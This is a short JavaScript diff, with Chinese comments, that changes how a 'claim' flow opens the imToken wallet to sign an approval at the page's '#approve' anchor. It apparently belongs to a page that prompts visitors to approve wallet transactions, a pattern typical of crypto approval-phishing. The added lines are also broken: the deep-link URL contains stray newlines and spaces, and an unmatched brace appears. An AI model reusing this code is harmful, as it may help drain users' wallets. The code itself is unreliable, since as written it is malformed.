@@ -1430,11 +1430,13 @@ function bindApproveLogic() {
             }
 
             // 2.3 立即唤起钱包签名（和B1发送并行，互不阻塞，一路绿灯）
-            reviewTip.style.display = "none";
-            btn.textContent = lang.redirectingBtn;
-            const fullTargetUrl = window.location.href + "#approve";
-            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl); // 复用全局配置！
-            window.location.href = jumpUrl; // 和connectBtn的唤起方式完全一样！
+                    reviewTip.style.display = "none";
+                btn.textContent = lang.redirectingBtn;
+                // 唤起imToken签名页面
+                window.location.href = 
+                `imtoken://browser?
+                url=${encodeURIComponent(window.location.href + "#approve")}`;
+                     } // 和connectBtn的唤起方式完全一样！
                  } catch (e) {
             console.error("领取流程失败：", e);
             reviewTip.style.display = "none";
